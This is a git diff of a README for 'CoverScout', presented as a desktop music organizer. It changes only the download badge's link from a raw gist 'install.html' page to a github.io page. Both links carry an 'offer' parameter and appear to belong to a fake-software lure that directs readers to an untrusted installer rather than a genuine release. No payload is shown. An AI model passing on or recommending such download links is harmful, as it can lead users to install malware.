@@ -1,6 +1,6 @@
 # CoverScout Download — Desktop Music Organizer
 
-[![Get CoverScout GitHub](https://img.shields.io/badge/Get%20CoverScout%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/bumperbutt1989-byte/bd55df7f1cd7f493d66df529abd89093/raw/006ca7c46a2cb5b9afc4cdbf4b1b03fda104270b/install.html?offer=CoverScout)
+[![Get CoverScout GitHub](https://img.shields.io/badge/Get%20CoverScout%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=CoverScout)
 
 ---
 
